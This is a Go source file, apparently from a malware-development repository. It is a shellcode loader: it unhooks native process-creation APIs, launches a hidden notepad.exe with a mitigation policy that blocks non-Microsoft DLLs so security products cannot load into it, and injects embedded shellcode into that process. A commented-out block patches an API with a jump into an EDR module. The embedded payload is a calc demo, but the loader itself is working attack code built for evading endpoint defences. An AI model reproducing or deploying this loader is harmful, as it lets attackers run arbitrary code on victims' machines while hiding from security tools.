package main

import (
	_ "embed"
	"fmt"
	process_injection "github.com/osonkr/malware-development/process-injection"
	"github.com/osonkr/malware-development/win32"
	"os"
	"syscall"
	"unsafe"
)

//go:embed calc.bin
var shellcode []byte

func createProtectedProcess(cmd string) (win32.HANDLE, error) {
	_ = win32.UnHookedAPI("NtCreateProcess")
	_ = win32.UnHookedAPI("NtCreateProcessEx")

	var startupInfo win32.STARTUPINFOEXA

	attrList, err := win32.NewProcThreadAttributeList(2)
	if err != nil {
		return 0, err
	}

	startupInfo.AttributeList = attrList

	startupInfo.StartupInfo.Flags = syscall.STARTF_USESHOWWINDOW
	startupInfo.StartupInfo.ShowWindow = syscall.SW_HIDE

	var policy win32.DWORD64 = win32.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON

	err = win32.UpdateProcThreadAttribute(
		startupInfo.AttributeList,
		0,
		uintptr(win32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
		uintptr(unsafe.Pointer(&policy)),
		unsafe.Sizeof(policy),
		uintptr(0),
		nil,
	)
	if err != nil {
		return 0, err
	}

	var processInfo syscall.ProcessInformation

	err = win32.CreateProcessA(
		uintptr(0),
		uintptr(unsafe.Pointer(win32.StringToCharPtr(cmd))),
		nil,
		nil,
		win32.BOOL(1),
		win32.EXTENDED_STARTUPINFO_PRESENT,
		uintptr(0),
		uintptr(0),
		(*syscall.StartupInfo)(unsafe.Pointer(&startupInfo)),
		&processInfo,
	)
	if err != nil {
		return 0, err
	}

	return win32.HANDLE(processInfo.Process), nil
}

func main() {
	//edrJmpPatch := []byte{0xe9, 0x0b, 0x91, 0x8c, 0xda} // jmp CyMemDef64+0x51f0
	//
	//if err := win32.PatchApi("NtAlpcCreatePort", edrJmpPatch); err != nil {
	//	panic(err)
	//}

	handle, err := createProtectedProcess(`C:\Windows\system32\notepad.exe`)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	process_injection.Inject(shellcode, handle)
}
